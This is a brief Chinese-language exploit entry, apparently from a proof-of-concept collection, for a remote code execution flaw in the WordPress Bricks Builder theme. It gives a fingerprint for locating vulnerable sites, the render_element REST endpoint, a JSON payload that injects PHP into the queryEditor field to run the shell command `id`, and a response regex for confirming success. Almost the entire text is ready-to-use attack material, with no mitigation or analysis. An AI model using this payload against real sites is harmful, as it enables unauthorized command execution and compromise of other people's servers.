# WordPress插件BricksBuilder存在RCE漏洞

WordPress ｜ 命令执行 ｜ —
- **指纹**：`body="/wp-content/themes/bricks/"`
- **请求**：`POST /wp-json/bricks/v1/render_element HTTP/1.1`

**Payload**
```
"postId": "1",
"nonce": "b5b275220f",
"element": {
"name": "container",
"settings": {
"hasLoop": "true",
"query": {
"useQueryEditor": true,
"queryEditor": "ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
"objectType": "post"
```
- **响应特征**：200 ^(?=.*?uid)(?=.*?Exception).*?$